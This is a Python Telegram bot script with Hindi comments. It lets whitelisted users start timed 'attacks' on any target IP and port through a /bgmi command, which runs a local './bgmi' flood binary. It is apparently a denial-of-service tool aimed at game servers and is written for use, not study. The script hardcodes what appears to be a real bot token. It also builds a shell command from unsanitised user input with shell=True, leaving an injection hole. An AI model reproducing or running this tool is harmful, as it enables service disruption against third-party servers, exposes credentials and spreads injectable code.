#!/usr/bin/python3

import telebot
import subprocess
import datetime
import os

# 🔑 अपना NEW TOKEN डालो
bot = telebot.TeleBot("8493335817:AAF5j3zCLF8GMG-gdzCO7PFua2Qwb5wVbT0")

# Admin ID
admin_id = ["8579860214"]

USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# ---------------- USERS ----------------
def read_users():
    try:
        with open(USER_FILE, "r") as f:
            return f.read().splitlines()
    except:
        return []

allowed_user_ids = read_users()

# ---------------- LOG ----------------
def log_command(user_id, target, port, time):
    with open(LOG_FILE, "a") as f:
        f.write(f"{user_id} | {target} | {port} | {time}\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log = f"{user_id} | {command}"
    if target:
        log += f" | {target}"
    if port:
        log += f" | {port}"
    if time:
        log += f" | {time}"
    with open(LOG_FILE, "a") as f:
        f.write(log + "\n")

# ---------------- START ----------------
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Bot chal raha hai ✅\nUse /help")

# ---------------- HELP ----------------
@bot.message_handler(commands=['help'])
def help_cmd(message):
    bot.reply_to(message, "/bgmi <target> <port> <time>")

# ---------------- ADD USER ----------------
@bot.message_handler(commands=['add'])
def add_user(message):
    uid = str(message.chat.id)
    if uid in admin_id:
        try:
            user = message.text.split()[1]
            allowed_user_ids.append(user)
            with open(USER_FILE, "a") as f:
                f.write(user + "\n")
            bot.reply_to(message, "User Added ✅")
        except:
            bot.reply_to(message, "Use: /add userid")
    else:
        bot.reply_to(message, "Admin only ❌")

# ---------------- BGMI ----------------
bgmi_cooldown = {}

@bot.message_handler(commands=['bgmi'])
def bgmi(message):
    user_id = str(message.chat.id)

    if user_id not in allowed_user_ids:
        bot.reply_to(message, "Not Authorized ❌")
        return

    # cooldown
    if user_id in bgmi_cooldown:
        if (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
            bot.reply_to(message, "Cooldown 5 min ⏳")
            return

    command = message.text.split()

    if len(command) != 4:
        bot.reply_to(message, "Usage: /bgmi <target> <port> <time>")
        return

    target = command[1]
    port = int(command[2])
    time = int(command[3])

    # ✅ FIXED PART
    if time >= 1 and time <= 300:
        bgmi_cooldown[user_id] = datetime.datetime.now()

        record_command_logs(user_id, "/bgmi", target, port, time)
        log_command(user_id, target, port, time)

        bot.reply_to(message, f"Attack Started 🚀\nTarget: {target}\nPort: {port}\nTime: {time}")

        cmd = f"./bgmi {target} {port} {time} 200"
        subprocess.run(cmd, shell=True)

        bot.reply_to(message, "Attack Finished ✅")
    else:
        bot.reply_to(message, "Time must be 1-300 ❌")

# ---------------- RUN ----------------
print("Bot Started...")
bot.infinity_polling()